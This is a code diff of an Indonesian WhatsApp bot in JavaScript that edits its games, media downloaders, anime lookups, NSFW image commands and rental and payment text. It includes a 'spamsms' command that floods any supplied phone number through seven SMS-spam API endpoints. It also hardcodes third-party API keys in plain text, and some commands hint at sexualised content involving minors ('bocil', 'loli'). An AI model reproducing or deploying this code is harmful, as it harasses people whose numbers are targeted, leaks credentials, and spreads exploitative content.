@@ -1664,7 +1536,7 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
        case 'caklontong':
               if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
               if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/caklontong2?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/caklontong2?apikey=najisbaperanRw`)
               get_result = get_result.result
               jawaban = get_result.answer
               kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
@@ -1771,10 +1643,10 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
          case 'spamsms':
                     if (args.length == 0) return reply(`Example: ${prefix + command} 08303030303030`)
                     nomor = args[0]
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=YTRAMLANID&nomor=${nomor}`)
+                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=YTRAMLANID&nomor=${nomor}`)
                     await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=YTRAMLANID&nomor=${nomor}`)
                     await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=YTRAMLANID&nomor=${nomor}`)
-                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=YTRAMLANID&nomor=${nomor}`)
+                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=YTRAMLANID&nomor=${nomor}`)
                     await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=YTRAMLANID&nomor=${nomor}`)
                     await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=YTRAMLANID&nomor=${nomor}`)
                     await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=YTRAMLANID&nomor=${nomor}`)
@@ -1830,38 +1702,14 @@ Ket : Ketik /resetgame , Untuk Mereset Permainan Yg Ada Di Grup!`, text, {contex
               break
        case 'belipremium':
        case 'buypremium':
-       case 'sc':
-       case 'iklan':
        case 'sewabot':
               gopeynya = 'https://i.ibb.co/zxdsXDW/IMG-20211001-074948-766-min.png'
               teksnya = `*── 「 PRICE LIST 」 ──*
-      
-KEUNTUNGAN BOTZ
-▢ BISA JAGA GRUP DARI LINK
-▢ BISA BIKIN STIKER TEKS,VIDIO DAN GAMBAR
-▢ BISA NYAPA TAMU YG MASUK
-▢ BISA PLAY AUDIO DAN VIDIO
 
-KELEBIHAN BOTZ
-▢ ON 24JAM KALAU GK DELAY
-▢ SELALU UPDATE FITUR 
-▢ BOT NO PASARAN
+*PSYCO SEWA BOT WA*
+FITUR:ANTILINK,WELCOME,ADD,KICK,DEMOTE,DAN MASIH BANYAK LAGI
 
-LIST HARGA SEWA BOTZ
-▢ PERHARI 2K
-▢ PERMINGGU 5K
-▢ PERBULAN 10K
-▢ PERMANEN 15K
-▢ PERMANEN + PREMIUM 25K
-
-*OWNER JUGA MENJUAL SC BOTZ FREE APIKEY*
-*DAN NO ENC ALL FITUR WORK R? 15K*
-
-• MINAT HIBUNGI OWNER
-https://wa.me/6285643260438
-
-YG MAU SEWA BOT MARI JOIN
-https://chat.whatsapp.com/FJdtdDteQkkBSXkAl44sey`
+HARGA PERMANEN:~20k~ PROMO!!! *10K* MINAT? HUBUNGI OWNER`
               dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: mek, caption: teksnya })
               break             
 //------------------< bayar menu >-------------------  
@@ -1870,7 +1718,7 @@ gopeynya = 'https://i.ibb.co/zxdsXDW/IMG-20211001-074948-766-min.png'
 teksnya = ` *「PAYMENT」*
 • GOPAY : https://telegra.ph/file/ffba186c9fd6f8c3e519f.jpg
 • PULSA : 085643260438
-• OVO     : 085643260438
+• OVO     : 088216185132
 ━━━━━━━━━━━━━━━━━━━━
 • NOTE : SERTA KAN BUKTI TF KEPADA OWNER`
         dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
@@ -2001,7 +1849,7 @@ case 'buttonwibu':
 *=> ${prefix}nekopoi3d*
 *=> ${prefix}nekopoicosplay*
 *=> ${prefix}nekopoisearch*`
-              dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
+              dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftext, caption: teksnya })
               break
 case 'buttonown':
               gopeynya = 'https://i.ibb.co/zxdsXDW/IMG-20211001-074948-766-min.png'
@@ -2027,7 +1875,7 @@ case 'buttonown':
 *=> ${prefix}sharelock*
 *=> ${prefix}spamsms*
 *=> ${prefix}chat* _nomor|teks_`
-              dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
+              dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftext, caption: teksnya })
               break 
 			
                                                                                                                         
@@ -2068,7 +1916,7 @@ case 'buttonown':
               try {
               if (!isUrl(q)) return reply('Linknya?')
               reply(mess.wait)
-              res = await axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${lolkey}&url=${args[0]}`)
+              res = await axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=najisbaperanRw&url=${args[0]}`)
               data = res.data.result
               for (let i = 0; i < data.media.length; i++) {
               sendMediaURL(from, data.media[i], data.caption, {thumbnail: Buffer.alloc(0)})
@@ -2083,7 +1931,7 @@ case 'buttonown':
               try {
               if (!q) return reply('Linknya?')
               reply(mess.wait)
-              res = await axios.get(`https://api.zeks.xyz/api/ig?apikey=${zekskey}&url=${args[0]}`)
+              res = await axios.get(`https://api.zeks.xyz/api/ig?apikey=NinoWangy&url=${args[0]}`)
               for(let i = 0; i < res.data.result.length; i++) {
               sendMediaURL(from, res.data.result[i].url, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
 ┆ *INSTAGRAM MEDIA*
@@ -2112,7 +1960,7 @@ case 'buttonown':
               if (!q) return reply('Link Yang Mana? ')
               if (!q.includes('soundcloud')) return reply(mess.error.Iv)
               reply(mess.wait)
-              anu = await fetchJson(`https://api.lolhuman.xyz/api/soundcloud?apikey=${lolkey}&url=${q}`)
+              anu = await fetchJson(`https://api.lolhuman.xyz/api/soundcloud?apikey=najisbaperanRw&url=${q}`)
              .then((data) => { sendMediaURL(from, data.result, mek) })
              .catch((err) => { reply(String(err)) })
               break
@@ -2281,12 +2129,12 @@ _*Tunggu Proses Upload Media......*_`
             .catch((err) => { reply(String(err)) })
              break
 case 'tiktok':
-case 'ttdl':
+              if (!isRegister) return reply(`You are not verified\n\nReply this chat and send bot password\n\nHint : \nPassword contains 4 digit number\nCheck password at: https://dha-chan02.github.io`)
               if (!q) return reply('Linknya?')
               if (!q.includes('tiktok')) return reply(mess.error.Iv)
               buttons = [{buttonId: `${prefix}tiktoknowm ${q}`,buttonText:{displayText: `🎥 Video`},type:1},{buttonId:`${prefix}ttaudio ${q}`,buttonText:{displayText:'🎵 Mp3'},type:1}]
-              imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/canss.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/canss.jpg`)})).imageMessage
-              buttonsMessage = {footerText:'Jangan Lupa Subscribe Yt PSYCO BOTZ\n Helpme to 1k subscriber', imageMessage: imageMsg,
+              imageMsg = (await dha.prepareMessageMedia(fs.readFileSync(`./media/sherlynn.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/sherlynn.jpg`)})).imageMessage
+              buttonsMessage = {footerText:'Jangan Lupa Subscribe Yt PSYCO BOTZ\n Helpme tu 1k subscriber', imageMessage: imageMsg,
               contentText:`Silahkan pilihan media yg mau di download kak:v`,buttons,headerType:4}
               prep = await dha.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
               dha.relayWAMessage(prep)
@@ -2296,7 +2144,7 @@ case 'ttdl':
       case 'tiktokaudio':
              if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
              ini_link = args[0]
-             get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolkey}&url=${ini_link}`)
+             get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=najisbaperanRw&url=${ini_link}`)
              dha.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
              break
       case 'fb':
@@ -2334,7 +2182,7 @@ case 'ttdl':
       case 'ssweb':
              if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/`)
              ini_link = args[0]
-             ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${lolkey}&url=${ini_link}`)
+             ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=najisbaperanRw&url=${ini_link}`)
              await dha.sendMessage(from, ini_buffer, image, { quoted: mek })
              break
        case 'nhentaipdf':
@@ -2343,13 +2191,13 @@ case 'ttdl':
              if (isNaN(Number(args[0]))) return await reply(mess.wrongFormat)
              try {
              henid = args[0]
-             get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
+             get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=najisbaperanRw`)
              get_result = get_result.result
              get_info = get_result.info
              teks = `\n${get_result.title_romaji}\n\n${get_result.title_native}\n\nCharacter : ${get_info.characters.join(", ")}\n`
              ini_image = await getBuffer(get_result.image[0])
              dha.sendMessage(from, ini_image, image, { caption: teks, quoted: mek })
-             anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolkey}`)
+             anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=najisbaperanRw`)
              pdf = await getBuffer(anu.result)
              dha.sendMessage(from, pdf, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${get_result.title_romaji}.pdf`, thumbnail: ini_image })
              } catch (e) {
@@ -2362,7 +2210,7 @@ case 'ttdl':
               if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
               reply(mess.wait)
               henid = args[0]
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=najisbaperanRw`)
               get_result = get_result.result
               ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
               ini_txt += `Title Native : ${get_result.title_native}\n`
@@ -2383,7 +2231,7 @@ case 'ttdl':
               if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
               reply(mess.wait)
               query = args.join(" ")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${lolkey}&query=${query}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=najisbaperanRw&query=${query}`)
               get_result = get_result.result
               ini_txt = `Id : ${get_result.id}\n`
               ini_txt += `Id MAL : ${get_result.idMal}\n`
@@ -2413,7 +2261,7 @@ case 'ttdl':
              if (!q) return reply(mess.wrongFormat)
              reply(mess.wait)
              try {
-             doujinnya = await fetchJson(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`).json()
+             doujinnya = await got.get(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`).json()
              let { data } = await doujinnya
              xixixai = `*Doujindesu Search*\n`
              for (let i = 0; i < data.length; i++) {
@@ -2426,20 +2274,11 @@ case 'ttdl':
              reply(String(e))
 }
              break
-     case 'ppcp':
-     case 'ppcouple':
-				reply(mess.wait)
-				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=${LeysKey}`) 
-				cowo = await getBuffer(anu.result.male)
-				dha.sendMessage(from, cowo, image, { quoted : freply, caption: 'Nih Kak Yg Cowo Nya'})
-				cewe = await getBuffer(anu.result.female)
-				dha.sendMessage(from, cewe, image, { quoted : freply, caption: 'Nih Kak Yg Cewe Nya'})
-				break
       case 'anime':
              if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
              reply(mess.wait)
              query = args.join(" ")
-             get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${lolkey}&query=${query}`)
+             get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=najisbaperanRw&query=${query}`)
              get_result = get_result.result
              ini_txt = `Id : ${get_result.id}\n`
              ini_txt += `Id MAL : ${get_result.idMal}\n`
@@ -2471,7 +2310,7 @@ case 'ttdl':
              if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
              reply(mess.wait)
              query = args.join(" ")
-             get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolkey}&query=${query}`)
+             get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=najisbaperanRw&query=${query}`)
              get_result = get_result.result
              ini_txt = `Title : ${get_result.title}\n`
              ini_txt += `Japanese : ${get_result.japanese}\n`
@@ -2499,7 +2338,7 @@ case 'ttdl':
               if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
               reply(mess.wait)
               query = args.join(" ")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${query}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=najisbaperanRw&query=${query}`)
               get_result = get_result.result
               ini_txt = `Title : ${get_result.title}\n`
               ini_txt += `Japanese : ${get_result.japanese}\n`
@@ -2532,7 +2371,7 @@ case 'ttdl':
        case 'nekopoi':
               if (args.length == 0) return reply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
               ini_url = args[0]
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${lolkey}&url=${ini_url}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=najisbaperanRw&url=${ini_url}`)
               get_result = get_result.result
               ini_txt = `\`\`\`き⃟🦈 Title : ${get_result.anime}\`\`\`\n`
               ini_txt += `\`\`\`き⃟🦈 Porducers : ${get_result.producers}\`\`\`\n`
@@ -2553,7 +2392,7 @@ case 'ttdl':
        case 'nekopoisearch':
               if (args.length == 0) return reply(`Example: ${prefix + command} Isekai Harem`)
               query = args.join(" ")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${lolkey}&query=${query}`)
+              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=najisbaperanRw&query=${query}`)
               get_result = get_result.result
               ini_txt = ""
               for (var x of get_result) {
@@ -2569,39 +2408,19 @@ case 'ttdl':
        case 'megumin':
        case 'wallnime':
               reply(mess.wait)
-              getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`).then((gambar) => {
+              getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=najisbaperanRw`).then((gambar) => {
               dha.sendMessage(from, gambar, image, { quoted: mek, thumbnail: Buffer.alloc(0) })
 })
               break
        
- case 'chiisaihentai': // ===《 PsycoBOTZ  》===\\
- case 'trap': // ===《 PsycoBOTZ  》===\\
- case 'blowjob': // ===《 PsycoBOTZ 》===\\
- case 'yaoi': // ===《 PsycoBOTZ  》===\\
- case 'ecchi': // ===《 PsycoBOTZ  》===\\
- case 'hentai': // ===《 PsycoBOTZ  》===\\
- case 'ahegao': // ===《 PsycoBOTZ  》===\\
- case 'hololewd': // ===《 PsycoBOTZ  》===\\
- case 'sideoppai': // ===《 PsycoBOTZ  》===\\
- case 'animefeets': // ===《 PsycoBOTZ  》===\\
- case 'animebooty': // ===《 PsycoBOTZ  》===\\
- case 'animethighss': // ===《 PsycoBOTZ  》===\\
- case 'hentaiparadise': // ===《 PsycoBOTZ  》===\\
- case 'animearmpits': // ===《 PsycoBOTZ  》===\\
- case 'hentaifemdom': // ===《 PsycoBOTZ  》===\\
- case 'lewdanimegirls': // ===《 PsycoBOTZ  》===\\
- case 'biganimetiddies': // ===《 PsycoBOTZ  》===\\
- case 'animebellybutton': // ===《 PsycoBOTZ  》===\\
- case 'hentai4everyone': // ===《 PsycoBOTZ  》===\\
-                  if (!isPremium && !isOwner) return reply('*FITUR INI HANYA UNTUK MEMBER PREMIUM SAJA*')
-                gga = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`)
-                 dha.sendMessage(from, gga, image, { quoted : freply })
-                     
-break
-       
+       case 'hentai':
+              getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=najisbaperanRw`).then((gambar) => {
+              dha.sendMessage(from, gambar, image, { quoted: mek })
+}) 
+              break
        case 'storyanime':
               reply(mess.wait)
-              anu = await fetchJson(`https://api.lolhuman.xyz/api/storynime?apikey=${lolkey}`)
+              anu = await fetchJson(`https://api.lolhuman.xyz/api/storynime?apikey=najisbaperanRw`)
               buffer = await getBuffer(anu.result)
               dha.sendMessage(from, buffer, video, { quoted: mek })
               break
@@ -2666,7 +2485,7 @@ break
             
 v = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
 inifile = sendMediaURL(from, v.url, )
-buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menu`,buttonText:{displayText:'BACK MENU'},type:1}]
+buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
               imageMsg = ( await dha.prepareMessage(from, inifile, 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
               buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
               contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
@@ -2682,7 +2501,7 @@ break
  let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
               let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
               fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
-		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}menu`,buttonText:{displayText:'BACK MENU'},type:1}]
+		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
               imageMsg = ( await dha.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
               buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
               contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
@@ -2723,7 +2542,7 @@ res = await yts(`${tec}`).catch(e => {
 reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
 })
 reply(`.Playing ${res.all[0].title}`)
-let thumbInfo = `*${botName}* 
+let thumbInfo = `*${botname}* 
  *Judul :* ${res.all[0].title}
  *ID Video :* ${res.all[0].videoId}
  *Diupload Pada :* ${res.all[0].ago}
@@ -2745,7 +2564,7 @@ case 'play2':
 				  if (args.length < 1) return reply('*Masukan judul nya?*')
                 reply('Loading.... ')
 				play = args.join(" ")
-				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=${zekskey}`)
+				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=NinoWangy`)
 				if (anu.error) return reply(anu.error)
 				infomp3 = `*「 PLAY VIDEO 」*
 				
@@ -2780,7 +2599,7 @@ Source : ${anu.result.source}
         case 'pinterest':
                     if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                     query = args.join(" ")
-                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${lolkey}&query=${query}`)
+                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=najisbaperanRw&query=${query}`)
                     ini_url = ini_url.result
                     ini_buffer = await getBuffer(ini_url)
                     await dha.sendMessage(from, ini_buffer, image, { quoted: mek })
@@ -2790,7 +2609,7 @@ Source : ${anu.result.source}
                if (args.length == 0) return reply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
                query = args.join(" ")
                reply(mess.wait)
-               get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${zekskey}&q=${query}`)
+               get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=NinoWangy&q=${query}`)
                get_data = get_data.data
                teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
 ┆ *SHOPEE*
@@ -2818,7 +2637,7 @@ teks += `\`\`\`き⃟🦈 Nama : ${get_data[i].name}\`\`\`
               if (args.length == 0) return reply(`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`)
               query = args.join(" ")
               reply(mess.wait)
-              get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${zekskey}&q=${query}`)
+              get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=NinoWangy&q=${query}`)
               get_result = get_result.result
               teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
 ┆ *PLAYSTORE*
@@ -2892,154 +2711,55 @@ a += `\`\`\`き⃟🦈 Title : ${i.title}\`\`\`
                throw err
 })
                break
-               
-               case 'vietnam':
-     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/cewe/vietnam?apikey=${psycokey}`)
+     case 'hijab':
+     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/asupan/hijaber?apikey=PsycoBot`)
      get_result = ini_result.result
-        ini_img = await getBuffer(get_result.url)
-     dha.sendMessage(from, ini_img, image, {quoted:mek})
+        ini_vid = await getBuffer(get_result.url)
+     dha.sendMessage(from, ini_vid, video, {mimetype: 'video/mp4',quoted:mek})
      break
-     
-     case 'indo':
-     case 'indonesia':
-     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/cewe/indonesia?apikey=${psycokey}`)
+     case 'ukty':
+     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/asupan/ukty?apikey=PsycoBot`)
      get_result = ini_result.result
-        ini_img = await getBuffer(get_result.url)
-     dha.sendMessage(from, ini_img, image, {quoted:mek})
+        ini_vid = await getBuffer(get_result.url)
+     dha.sendMessage(from, ini_vid, video, {mimetype: 'video/mp4',quoted:mek})
      break
-     
-     case 'malay':
-     case 'malaysia':
-     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/cewe/malaysia?apikey=${psycokey}`)
+     case 'bocil':
+     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/asupan/bocil?apikey=PsycoBot`)
      get_result = ini_result.result
-        ini_img = await getBuffer(get_result.url)
-     dha.sendMessage(from, ini_img, image, {quoted:mek})
+        ini_vid = await getBuffer(get_result.url)
+     dha.sendMessage(from, ini_vid, video, {mimetype: 'video/mp4',quoted:mek})
      break
-     
-     case 'korea':
-     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/cewe/korea?apikey=${psycokey}`)
+     case 'ghea':
+     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/asupan/ghea?apikey=PsycoBot`)
      get_result = ini_result.result
-        ini_img = await getBuffer(get_result.url)
-     dha.sendMessage(from, ini_img, image, {quoted:mek})
+        ini_vid = await getBuffer(get_result.url)
+     dha.sendMessage(from, ini_vid, video, {mimetype: 'video/mp4',quoted:mek})
      break
-     
-   case 'jepang':
-     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/cewe/japan?apikey=${psycokey}`)
+     case 'rika':
+     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/asupan/rikagusriani?apikey=PsycoBot`)
      get_result = ini_result.result
-        ini_img = await getBuffer(get_result.url)
-     dha.sendMessage(from, ini_img, image, {quoted:mek})
+        ini_vid = await getBuffer(get_result.url)
+     dha.sendMessage(from, ini_vid, video, {mimetype: 'video/mp4',quoted:mek})
      break
-     
-     case 'thailand':
-     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/cewe/thailand?apikey=${psycokey}`)
+     case 'asupan':
+     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/asupan/cecan?apikey=PsycoBot`)
      get_result = ini_result.result
-        ini_img = await getBuffer(get_result.url)
-     dha.sendMessage(from, ini_img, image, {quoted:mek})
+        ini_vid = await getBuffer(get_result.url)
+     dha.sendMessage(from, ini_vid, video, {mimetype: 'video/mp4',quoted:mek})
      break
-     
-     case 'china':
-     ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/cewe/china?apikey=${psycokey}`)
-     get_result = ini_result.result
-        ini_img = await getBuffer(get_result.url)
-     dha.sendMessage(from, ini_img, image, {quoted:mek})
-     break
-     
-case 'cecan': case 'hijaber': case 'santuy':
-case 'ukty': case 'bocil': case 'ghea': case 'rikagusriani':
-ini_result = await fetchJson(`https://api-psycho.herokuapp.com/api/asupan/${command}?apikey=${psycokey}`)
-kodo = `*_CLICK NEXT UNTUK SELANJUTNYA_*`
-   sendButVideo(from, kodo, `${fake}`, get_result, [                      
-          {
-            buttonId: `${prefix+command}`,
-            buttonText: {
-              displayText: `NEXT`,
-            },
-            type: 1,
-          },
-        ]);                 
-                    break    
-        
         case 'nulis':
-                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
-                teks = args.join(' ')
-               tiyo = `SILAHKAN PILIH SALAH SATU`
-sendButMessage(from, tiyo, `${fake}`, [
-            {              
-              buttonId: `${prefix}nuliskanan ${teks}`,
-              buttonText: {
-                displayText: `KANAN`,
-              },
-              type: 1,
-               },
-          {
-            buttonId: `${prefix}nuliskiri ${teks}`,
-            buttonText: {
-              displayText: `KIRI`,
-            },
-            type: 1,          
-          },
-        ]);               
-        break;                 
-        case 'folio':
-                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
-                teks = args.join(' ')
-               tiyt = `SILAHKAN PILIH SALAH SATU`
-sendButMessage(from, tiyt, `${fake}`, [
-            {              
-              buttonId: `${prefix}foliokanan ${teks}`,
-              buttonText: {
-                displayText: `KANAN`,
-              },
-              type: 1,
-               },
-          {
-            buttonId: `${prefix}foliokiri ${teks}`,
-            buttonText: {
-              displayText: `KIRI`,
-            },
-            type: 1,          
-          },
-        ]);               
-        break;                
-				        
-        case 'nuliskanan':
-               if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
+        case 'tulis':
                if (args.length < 1) return reply('Yang mau di tulis apaan?')
                teks = args.join(' ')
                reply(mess.wait)
-               kon = (`https://hardianto-chan.herokuapp.com/api/nuliskanan?text=${teks}&apikey=hardianto`)
-anu = await getBuffer(kon)
-dha.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./media/ganteng.jpg')})
-break
-
-        case 'nuliskiri':
-               if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
-               if (args.length < 1) return reply('Yang mau di tulis apaan?')
-               teks = args.join(' ')
-               reply(mess.wait)
-               kon = (`https://hardianto-chan.herokuapp.com/api/nuliskiri?text=${teks}&apikey=hardianto`)
-anu = await getBuffer(kon)
-dha.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./media/ganteng.jpg')})
-break
-
-        case 'foliokanan':
-               if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
-               if (args.length < 1) return reply('Yang mau di tulis apaan?')
-               teks = args.join(' ')
-               reply(mess.wait)
-               kon = (`https://hardianto-chan.herokuapp.com/api/foliokanan?text=${teks}&apikey=hardianto`)
-anu = await getBuffer(kon)
-dha.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./media/ganteng.jpg')})
-break
-        case 'foliokiri':
-               if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
-               if (args.length < 1) return reply('Yang mau di tulis apaan?')
-               teks = args.join(' ')
-               reply(mess.wait)
-               kon = (`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${teks}&apikey=hardianto`)
-anu = await getBuffer(kon)
-dha.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./media/ganteng.jpg')})
-break
+               nulis = encodeURIComponent(teks)
+               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
+               if (res.data.error) return reply(res.data.error)
+               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
+               dha.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
+               return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
+})
+               break
 //------------------< Level >-------------------
       case 'level': 
               if (!isGroup) return reply(mess.only.group)
@@ -3053,7 +2773,7 @@ break
               } catch {
               profilePic = errorImg
 }
-              buffer = await getBuffer(`https://api.lolhuman.xyz/api/rank?apikey=${lolkey}&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
